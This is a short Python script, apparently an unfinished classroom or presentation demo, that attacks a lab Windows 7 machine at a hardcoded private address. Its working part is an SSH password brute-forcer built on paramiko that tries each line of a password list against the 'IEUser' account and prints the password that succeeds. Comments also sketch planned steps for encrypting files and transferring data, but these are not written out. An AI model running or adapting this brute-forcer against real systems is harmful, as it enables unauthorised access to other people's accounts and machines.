#!/usr/bin/env python3

import smtplib
import paramiko
import time


#play video

#def encrypt file

# sniff network 
def sniffNetwork():
    #IPAdress to second Windows 7 machine to speed up presentation
    ipAddress= '192.168.0.60'
    return ipAddress

#bruteforce
def bruteForce(user, ipAddress):
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect('192.168.0.60', username="IEUser", password=secret)
            return secret

        except:
            time.sleep(1)
            print(secret)

#Transfer


def main():
    user= "IEUser"
    ipAddress= sniffNetwork()
    print(ipAddress)
    password=bruteForce(user,ipAddress)
    print(password)
main()